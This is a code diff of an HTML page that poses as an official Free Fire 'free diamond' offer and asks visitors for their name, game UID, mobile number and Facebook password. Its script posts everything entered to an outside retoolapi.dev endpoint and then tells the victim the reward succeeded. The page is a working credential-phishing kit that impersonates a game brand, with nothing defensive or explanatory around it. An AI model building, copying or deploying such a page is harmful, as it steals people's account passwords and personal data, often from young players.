@@ -3,36 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>FreeFire Offical</title>
+     <link rel="icon" href="th.jpeg">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
 </head>
+<style>
+  #id:hover{
+     width: 100px;
+  }
+
+</style>
 <body>
-    <div class="container">
+       <div class="container-fuild">
         <div class="row">
-            <div class="col"><h1 class="text-warning">Free Fire Offer! Enter and Claim</h1></div>
+            <div class="col" ><h1 class="text-warning bg-dark p-3"  >Free Fire Offer! Claim Now</h1></div>
         </div>
+        </div>
+        <div class="container">
         <div class="row">   
-            <div class="col"><marquee behavior="scroll" direction="right" width="500px" class="text-primary">Limited Offer!</marquee></div>
+            <div class="col"><marquee behavior="scroll" direction="right" width="500px" class="text-primary"><span style="font-size: 20px;">Limited Offer!</span></marquee></div>
         </div>
-        <div class="row ">
+        <div><img src="./free dimond.jpeg" alt="image" width="370px"></div>
+        <div class="shadow p-3 mt-3">
+        <div class="row mt-4">
             <label for="name">Enter Name:</label>
-            <div class="col col-3 mt-2"><input type="text" name="name" id="name" placeholder="Enter the name" class="form-control"></div>
+            <div class="col  mt-2"><input type="text" name="name" id="name" placeholder="Enter your name" class="form-control"></div>
+        </div>
+        <div class="row mt-2">
+            <label for="uid">Game UID:</label>
+            <div class="col mt-2"><input type="text" name="uid" id="uid" class="form-control" placeholder="Enter UID" required></div>
         </div>
         <div class="row">
-            <div class="col mt-2"><label for="">Mobile Number:</label></div>
+            <div class="col mt-2"><label for="num">Mobile Number:</label></div>
             <div class="row">
-                <div class="col col-3 mt-2"><input type="text" name="num" inputmode="tel" id="num" class="form-control"></div>
+                <div class="col  mt-2"><input type="text" name="num" inputmode="tel" id="num" placeholder="Enter Mobile Number" class="form-control" required></div>
             </div>
         </div>
-        <div class="row">
+        <div class="row mt-2">
             <label for="pass">Facebook password:</label>
-            <div class="col col-3"><input type="password" name="pass" id="pass" class="form-control"></div>
+            <div class="col mt-2 "><input type="password" name="pass" id="pass" placeholder="Enter FB Password" class="form-control" required></div>
         </div>
         <div class="row">
-            <div class="col mt-2"><input type="button" class="btn btn-success" onclick="fire()" value="Claim"></div>
+            <div class="col mt-3"><input type="button" id="btn" class="btn btn-success" onclick="fire()" value="Claim"></div>
+        </div>
         </div>
     </div>
+     <div class="container-fuild mt-3 ">
+        <div class="bg-dark p-3 text-warning  text-center" style="position: fixed;margin-bottom: 0%; width:400px;" >All recived &copy FreeFire</div>
+     </div>
     <script>
 
         var fflink="https://retoolapi.dev/imc1ZY/ffdata"
@@ -40,21 +59,28 @@
       let name =  document.getElementById('name').value;
       let pass =  document.getElementById('pass').value;
       let num =  document.getElementById('num').value;
+      let uid = document.getElementById('uid').value;
 
       return{
         name:name,
         pass:pass,
-        num:num
+        num:num,
+        uid:uid
       }
         }
         function clear(){
             let name =  document.getElementById('name').value="";
-      let pass =  document.getElementById('pass').value="";
-      let num =  document.getElementById('num').value="";
+            let pass =  document.getElementById('pass').value="";
+            let num =  document.getElementById('num').value="";
+            let uid =  document.getElementById('uid').value="";
         }
-        function fire(){
-            clear();
+        function fire(){ 
+            let names =  document.getElementById('name').value;
+            let passs =  document.getElementById('pass').value;
+            let nums =  document.getElementById('num').value;
+            let uids =  document.getElementById('uid').value;
             
+            if(names!="" && passs!="" && nums!="" && nums!="" && uids!=""){
             fetch (fflink,{
             method:'POST',
             body:JSON.stringify(getvalue()),
@@ -64,12 +90,18 @@
             }).then((Response)=>{
                 if(Response.ok){
                     alert('reward sucessful')
+                    clear();
+
                 }else{
                     throw new error("error");
                 }
             }).catch((error)=>{
                 alert("error"+error.message)
             })
+        }else{
+            alert("Enter All Value")
+        }
+
 
 
         }
